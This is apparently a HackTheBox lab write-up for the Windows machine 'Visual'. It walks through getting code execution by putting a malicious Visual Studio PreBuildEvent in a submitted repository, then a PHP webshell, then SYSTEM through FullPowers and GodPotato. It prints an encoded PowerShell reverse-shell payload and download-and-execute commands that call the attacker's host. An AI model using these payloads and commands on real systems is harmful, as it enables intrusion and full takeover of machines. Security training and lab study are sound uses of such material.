---
render_with_liquid: false
title: HackTheBox Writeup  Visual
date: 2023-10-01 20:37:49 +1400
tags: [hackthebox, nmap, windows, feroxbuster, git, git-server, misconfiguration, visual-studio, dotnet-framework, csharp, villian, reverse-ssh, php, apache, webshell, privilege-token, fullpowers, potato-attacks, godpotato]
---



Visual is a Medium Windows machine featuring a web service that accepts user-submitted `.NET 6.0` project repositories, building and returning the executables. By setting up a local Git repository containing a project with the `PreBuild` option set, a payload can be executed, leading to a reverse shell on the machine as the user `enox`. The user is able to write files on the web root directory and thus an attacker can get a reverse shell as the `nt authority\local service` account. Looking at the privileges of the service account, one is able to deduce that the basic privileges have been stripped off of the account. Nonetheless, there is a way to recover the privileges of the `local service` account, including the `SeImpersonate` privilege. Once this privilege is restored, the attacker is able to use a Potato exploit and get a shell as `nt authority\system`.

# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ writehosts htb "'10.129.108.243 visual.htb'"
[+] Hosts: 10.129.108.243 visual.htb
+---------+--------+----------------+------------+
| PROFILE | STATUS |       IP       |   DOMAIN   |
+---------+--------+----------------+------------+
| htb     | on     | 10.129.108.243 | visual.htb |
+---------+--------+----------------+------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sun Oct  1 20:37:48 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/htb/Visual/results/10.129.72.48/scans/_full_tcp_nmap.txt -oX /home/kali/htb/Visual/results/10.129.72.48/scans/xml/_full_tcp_nmap.xml 10.129.72.48
Nmap scan report for 10.129.72.48
Host is up, received user-set (0.054s latency).
Scanned at 2023-10-01 20:37:49 CST for 108s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (87%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=10/1%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=65196889%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TS=U)
SEQ(SP=105%GCD=1%ISR=10D%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   55.05 ms 10.10.14.1
2   55.25 ms 10.129.72.48

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Oct  1 20:39:37 2023 -- 1 IP address (1 host up) scanned in 108.29 seconds
```


## 80 - HTTP : Visual - Revolutionizing Visual Studio Builds


### Info

![](/assets/obsidian/1a667c7e0b30593e2dc25b1e73c6b038.png)

```ruby
http://10.129.108.243 [200] [Visual - Revolutionizing Visual Studio Builds] [Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17] [Apache HTTP Server:2.4.56,OpenSSL:1.1.1t,PHP:8.1.17,Windows Server] [7342e7023befe16821bd1a7a6d528bfb72dad043]
```


### Directory

```bash
feroxbuster -u http://10.129.108.243:80 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -r -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ cat ferox_80.txt
200      GET        7l       36w      336c http://10.129.108.243/js/scripts.js
200      GET        0l        0w        0c http://10.129.108.243/submit.php
200      GET        8l       29w    28898c http://10.129.108.243/assets/favicon.ico
200      GET      117l      555w     7534c http://10.129.108.243/index.php
200      GET    11559l    23754w   250218c http://10.129.108.243/css/styles.css
200      GET      117l      555w     7534c http://10.129.108.243/
200      GET       16l       63w      989c http://10.129.108.243/assets/
200      GET        7l       36w      336c http://10.129.108.243/js/scripts.js
200      GET        0l        0w        0c http://10.129.108.243/submit.php
200      GET      117l      555w     7534c http://10.129.108.243/index.php
200      GET    11559l    23754w   250218c http://10.129.108.243/css/styles.css
200      GET       16l       63w      989c http://10.129.108.243/assets/
200      GET       16l       62w      980c http://10.129.108.243/css/
200      GET      117l      555w     7534c http://10.129.108.243/Index.php
200      GET       16l       64w      981c http://10.129.108.243/js/
503      GET       11l       44w      404c http://10.129.108.243/examples
200      GET        8l       29w    28898c http://10.129.108.243/assets/favicon.ico
200      GET      117l      555w     7534c http://10.129.108.243/
403      GET       11l       47w      423c http://10.129.108.243/licenses
200      GET        8l       29w    28898c http://10.129.108.243/Assets/favicon.ico
200      GET      117l      555w     7534c http://10.129.108.243/INDEX.php
200      GET       16l       63w      989c http://10.129.108.243/Assets/
200      GET    11559l    23754w   250218c http://10.129.108.243/CSS/styles.css
200      GET        7l       36w      336c http://10.129.108.243/JS/scripts.js
200      GET       16l       64w      981c http://10.129.108.243/JS/
200      GET       16l       62w      980c http://10.129.108.243/CSS/
403      GET       11l       47w      423c http://10.129.108.243/phpmyadmin
403      GET       11l       47w      423c http://10.129.108.243/webalizer
200      GET        0l        0w        0c http://10.129.108.243/Submit.php
403      GET       11l       47w      423c http://10.129.108.243/server-status
```


# User Flag
---

## Shell as enox

### Setup git server via gitea

The function requires a git server to work properly

![](/assets/obsidian/f80674d2ac9e9fb0252d6bb075bc78c9.png)

> Install **gitea** with docker - https://docs.gitea.com/installation/install-with-docker

```bash
mkdir gitea
cd gitea
nvim docker-compose.yml
sudo docker-compose -f docker-compose.yml up
```

![](/assets/obsidian/a4308ea71c221e8a34144900e60f1ab6.png)


### Test example VS project

The site says it will build a .net project for me, lets see what it looks like by submitting a random repo

![](/assets/obsidian/32b61f7645ba0d6d5685d90909f6e65c.png)

Created a repo on **gitea** called `test`

![](/assets/obsidian/0e5817775719d8a31e760a27b841e68a.png)

Google Search : `dotnet 6 example github`

> https://github.com/hgmauri/sample-dotnet6

Clone it then push to my **gitea** server

```bash
git clone https://github.com/hgmauri/sample-dotnet6
cd sample-dotnet6
git init
git checkout -b main
git add .
git commit -m "first commit"
git remote add origin http://localhost:3000/bravosec/test.git
git push -u origin main
```

![](/assets/obsidian/db0dd56eed307ddd3437e830c6ac0aae.png)

it errored out and revealed directories and execution commands

![](/assets/obsidian/6513043444cae463de000bee111aef42.png)

### Test RCE in visual studio build script

Created a new repo on **gitea** called `test-rce`

Created a new Csharp console project using **Visual Studio**

![](/assets/obsidian/167a19cde9a9ea6f2d33c89d943537cc.png)

Then went to `Project Properties -> Build Event`, add a ping command to check if it pings back to me

This was to confirm if code execution works on target

![](/assets/obsidian/01545a0fd42896d49ba84d604be9720a.png)

Then push my project to **gitea**

```bash
cd /media/sf_kali-share/HTB-Visual-Test
git init
git checkout -b main
git add .
git commit -m "first commit"                                                                        
git remote add origin http://localhost:3000/bravosec/test-rce.git
git push -u origin main
```

> Submit http://10.10.16.13:3000/bravosec/test-rce.git

Confirmed RCE

![](/assets/obsidian/acd917bad7789f49e98e2a6330d1808c.png)

![](/assets/obsidian/e51768af1cc48aeaf05b766ee6b7178e.png)

### Get a shell via visual studio build script

Used **villian** to generate and handle **haoxshell**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ villain -x 5151

    ┬  ┬ ┬ ┬  ┬  ┌─┐ ┬ ┌┐┌
    └┐┌┘ │ │  │  ├─┤ │ │││
     └┘  ┴ ┴─┘┴─┘┴ ┴ ┴ ┘└┘
                 Unleashed

[Meta] Created by t3l3machus
[Meta] Follow on Twitter, HTB, GitHub: @t3l3machus
[Meta] Thank you!

[Info] Initializing required services:
[0.0.0.0:6501]::Team Server
[0.0.0.0:4443]::Netcat TCP Multi-Handler
[0.0.0.0:5151]::HoaxShell Multi-Handler
[0.0.0.0:8888]::HTTP File Smuggler

[Info] Welcome! Type "help" to list available commands.
Villain > generate payload=windows/hoaxshell/powershell_iex LHOST=tun0 encode
Generating backdoor payload...
powershell -ep bypass -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAkAEMAbwBuAGYAaQByAG0AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIATgBvAG4AZQAiADsAJABzAD0AJwAxADAALgAxADAALgAxADYALgAxADMAOgA1ADEANQAxACcAOwAkAGkAPQAnADIAOAA5ADcAZQAxAC0ANQA3AGYAYQA4ADMALQAwADgAZAAzADUAMwAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwAyADgAOQA3AGUAMQAvACQAZQBuAHYAOgBDAE8ATQBQAFUAVABFAFIATgBBAE0ARQAvACQAZQBuAHYAOgBVAFMARQBSAE4AQQBNAEUAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkAGkAfQA7AGYAbwByACAAKAA7ADsAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANQA3AGYAYQA4ADMAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkAGkAfQApADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHgAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADAAOABkADMANQAzACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
Copied to clipboard!
```

Modify my ping command to the revshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual/HTB-Visual-Test]
└─$ grep -rin 10.10.16.13
ConsoleApp1/ConsoleApp1.csproj:54:    <PreBuildEvent>ping 10.10.16.13</PreBuildEvent>
```

![](/assets/obsidian/bbed003c3755fb5f7a31dfa2479d603e.png)

Commit the changes then push

```bash
git commit -am "Revshell"
git push
```

> Submit - http://10.10.16.13:3000/bravosec/test-rce.git

```bash
[Shell] Backdoor session established on 10.129.48.216
Villain > sessions

Session ID            IP Address     OS Type  User         Owner  Status
--------------------  -------------  -------  -----------  -----  ------
2897e1-57fa83-08d353  10.129.48.216  Windows  VISUAL\enox  Self   Active

```

```powershell
Villain > shell 2897e1-57fa83-08d353

This session is unstable. Consider running a socket-based rshell process in it.
Interactive pseudo-shell activated.
Press Ctrl + C or type "exit" to deactivate.

VISUAL\enox> whoami
visual\enox

VISUAL\enox> cat C:\users\enox\Desktop\user.txt
aee6540f5079209f05597adc4f8b22e1
```

# Root Flag
---

## Reverse ssh

**[reverse_ssh](https://github.com/NHAS/reverse_ssh)** can help : secure the connection, fully interactive shell, port forwarding, file transfer... and much more

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:22521
```

```bash
VISUAL\enox> (new-object net.webclient).DownloadFile("http://10.10.16.13/win/client.exe", "C:\Programdata\ssh.exe"); C:\Programdata\ssh.exe -d 10.10.16.13:22521
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 6dfd4f3f3b3713baca80f8ae30913b8a38b9538e | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| visual.enox.visual                       |                          |
| 10.129.48.216:50642                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ ssh -J 127.0.0.1:22521 visual.enox.visual
PS C:\users\enox\Documents>
```


## Enumeration

```bash
PS C:\users\enox\Documents> whoami /all
USER INFORMATION
----------------

User Name   SID
=========== =============================================
visual\enox S-1-5-21-328618757-2344576039-2580610453-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
PS C:\users\enox\Documents> net user

User accounts for \\VISUAL

-------------------------------------------------------------------------------
Administrator            DefaultAccount           enox
Guest                    WDAGUtilityAccount
The command completed successfully.
```

```powershell
PS C:\users\enox\Documents> systeminfo

Host Name:                 VISUAL
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA642
Original Install Date:     6/10/2023, 10:08:12 AM
System Boot Time:          10/3/2023, 12:38:26 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,888 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,090 MB
Virtual Memory: In Use:    1,709 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.48.216
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Did not find any useable public exploit for privesc

```bash
python wes.py ~/htb/Visual/systeminfo.txt --impact "Elevation of Privilege" -e
```

![](/assets/obsidian/e479df16c1d9a872e498e65cbe9116e0.png)

Found an interesting script in `Documents`

```powershell
PS C:\Users\enox\Documents> ls -Force| sort LastWriteTime -Descending


    Directory: C:\Users\enox\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hsl        6/10/2023  10:59 AM                My Videos
d--hsl        6/10/2023  10:59 AM                My Pictures
d--hsl        6/10/2023  10:59 AM                My Music
-a----        6/10/2023   2:17 AM           4135 compile.ps1
```

The script was for building Visual Studio Projects, which was implemented in the wenbsite

![](/assets/obsidian/9d143da1e8bc75485b78c4d36d4c8bfc.png)


## From enox to local service


### PHP Web Shell

The script mentioned the `uploads` dir, 

If we get a shell as the **web service account**, we might have chances to abuse the tokens

![](/assets/obsidian/ae58648649e38c153262b3227aa3a328.png)

```bash
PS C:\Users\enox\Documents> cd C:\xampp\htdocs\uploads\
PS C:\xampp\htdocs\uploads> ls


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/3/2023   2:08 AM                dce3eb56bb1745ec0c657677f92458
-a----        6/10/2023   4:20 PM             17 .htaccess
-a----        10/3/2023   1:53 AM              0 todo.txt
```

> They used `.htaccess` to disable directory listing

```bash
PS C:\xampp\htdocs\uploads> cat .htaccess
Options -Indexes
```

Simple php webshell

> PHP Reverse shell that works on all platforms
> > https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
{: .prompt-tip }

> Php webshell oneliners won't work on this windows machine, need to split in multilines
{: .prompt-warning }

> `x.php`

```php
<?php

system($_REQUEST['x']);

?>
```

Upload the webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ scp -J 127.0.0.1:22521 x.php visual.enox.visual:'C:\xampp\htdocs\uploads\x.php'
```

Check user

> Websites don't usually log POST requests, this will be stealthier
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ curl -X POST "http://visual.htb/uploads/x.php?x=whoami"
nt authority\local service
```

Start reverse ssh as `nt authority\local service`

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ curl -X POST "http://visual.htb/uploads/x.php?x=C:\Programdata\ssh.exe+-d+10.10.16.13:22521"
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 05e8aa760d31c7886c1b4096cf38c68877c0b9f5 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| nt.authority.local.service.visual        |                          |
| 10.129.48.216:54192                      |                          |
+------------------------------------------+--------------------------+
| 7918929cd44fb279e6c3ad0bafd9a29808cd4711 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| visual.enox.visual                       |                          |
| 10.129.48.216:52255                      |                          |
+------------------------------------------+--------------------------+

┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh -J 127.0.0.1:22521 nt.authority.local.service.visual
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\uploads> whoami
nt authority\local service
```


## From local service to SYSTEM


### Recover privilege tokens

```bash
PS C:\xampp\htdocs\uploads> whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Service accounts should have `SeImpersonatePrivilege` token as default, find a way to recover it

Google : `nt authority\local service privesc`

> https://itm4n.github.io/localservice-privileges/

Recover privilege tokens via **[FullPowers](https://github.com/itm4n/FullPowers)**

```bash
PS C:\xampp\htdocs\uploads> (new-object net.webclient).DownloadFile("http://10.10.16.13/win/FullPowers.exe", "C:\programdata\f.exe")

PS C:\xampp\htdocs\uploads> C:\programdata\f.exe
[+] Started dummy thread with id 836
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```


### Abuse privilege tokens

Since we have tokens such as `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege` to abuse, use potato attacks to get system

I chose the newest **Godpotato**

```bash
PS C:\Windows\system32> (new-object net.webclient).DownloadFile("http://10.10.16.13/win/GodPotato-NET4.exe", "c:\programdata\g.exe")
PS C:\Windows\system32> c:\programdata\g.exe -cmd "C:\Programdata\ssh.exe -d 10.10.16.13:22521"
```

```bash
[*] CombaseModule: 0x140710498795520
[*] DispatchTable: 0x140710501101680
[*] UseProtseqFunction: 0x140710500477856
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d897000c-9c6b-4d37-9375-77aefe2fa694\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005802-16b0-ffff-db3f-5b8f14f1104d
[*] DCOM obj OXID: 0x1d7fb95fa102bb52
[*] DCOM obj OID: 0x11703547f45e3c61
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 864 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1316
2023/10/03 11:12:34 Forking
2023/10/03 11:12:36 Connecting to  10.10.16.13:22521
2023/10/03 11:12:37 [client] WARNING client.go:134 func1() : No server key specified, allowing connection to 10.10.16.13:22521
2023/10/03 11:12:38 Successfully connnected 10.10.16.13:22521
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| c9a121b45e1d0ef66083c2b03010fe45c43778e7 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| nt.authority.local.service.visual        |                          |
| 10.129.48.216:63833                      |                          |
+------------------------------------------+--------------------------+
| e7357da72a276bb4f5b4e01ff77d3a76949f76bb | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| visual.enox.visual                       |                          |
| 10.129.48.216:63771                      |                          |
+------------------------------------------+--------------------------+
| fcb581f4eb88fbe63895d60c753be1d946c771cd | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| nt.authority.system.visual               |                          |
| 10.129.48.216:64544                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Visual]
└─$ ssh -J 127.0.0.1:22521 nt.authority.system.visual
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat c:\users\administrator\desktop\root.txt
0c42b1b66888ff857b9ccf6d29f64486
PS C:\Windows\system32>
```

![](/assets/obsidian/aab50702b6a52e737788726111d341e9.png)

# Additional
---

## PrivEscCheck

Winpeas is slow, so I always run **[PrivescCheck](https://github.com/itm4n/PrivescCheck)** first, this usually finishes in 2 minutes and gives an intermediate level result

```bash
PS C:\users\enox\Documents> iex (new-object net.webclient).downloadstring("http://10.10.16.13/pwsh/PrivescCheck.ps1"); Invoke-PrivescCheck
```

![](/assets/obsidian/42eeb7703449ef39bff117678db73190.png)

![](/assets/obsidian/0a653fa059862c251492cc24690c1fc2.png)